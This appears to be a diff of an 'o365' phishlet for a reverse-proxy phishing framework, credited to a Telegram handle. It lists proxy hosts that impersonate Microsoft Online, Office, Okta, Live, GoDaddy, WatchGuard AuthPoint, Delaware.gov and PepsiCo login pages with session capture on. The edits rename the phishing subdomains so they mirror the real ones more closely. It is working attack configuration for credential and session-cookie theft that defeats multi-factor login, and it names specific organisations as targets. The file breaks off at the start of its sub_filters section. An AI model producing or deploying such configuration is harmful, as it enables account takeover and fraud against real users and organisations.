@@ -1,32 +1,32 @@
 name: "o365"
-author: "https://t.me/Jhay_nyce"
+author: "https://t.me/Jhay_nycet"
 min_ver: "2.4.2"
 proxy_hosts:
-  - { phish_sub: "tfdgede", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
-  - { phish_sub: "tgfrew", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "office", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "react", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "o", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "sci", orig_sub: "sci", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "dotfoods", orig_sub: "dotfoods", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "louyfd", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "tghre", orig_sub: "login", domain: "bx.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "mswfedwd", orig_sub: "msfed", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "advasath", orig_sub: "advath", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "smusxwsxath", orig_sub: "smusxath", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "ulgroedwup", orig_sub: "ulgroup", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "login", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "login", orig_sub: "login", domain: "bx.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "msfed", orig_sub: "msfed", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "advath", orig_sub: "advath", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "smusxath", orig_sub: "smusxath", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "ulgroup", orig_sub: "ulgroup", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "YWNjb", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "thuyi", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "ygtrc", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
-  - { phish_sub: "tgews", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false }
-  - { phish_sub: "fdcx", orig_sub: "sso", domain: "secureserver.net", session: true, is_landing: false, auto_filter: true  }
+  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
+  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "sso", orig_sub: "sso", domain: "secureserver.net", session: true, is_landing: false, auto_filter: true  }
   - { phish_sub: "vn3Hg", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
   - {phish_sub: '', orig_sub: '', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
-  - { phish_sub: "ujyfge", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "ddswss", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "ujkiy", orig_sub: "usa", domain: "authpoint.watchguard.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "fsdss", orig_sub: "auth", domain: "op2online.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "ftrer", orig_sub: "id", domain: "delaware.gov", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "vfdde", orig_sub: "secure", domain: "pepsico.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "sp.authpoint.usa", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "sp.authpoint.usa", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "usa", orig_sub: "usa", domain: "authpoint.watchguard.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "auth", orig_sub: "auth", domain: "op2online.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "id", orig_sub: "id", domain: "delaware.gov", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "secure", orig_sub: "secure", domain: "pepsico.com", session: true, is_landing: false, auto_filter: false }
 
 sub_filters:
   # - {
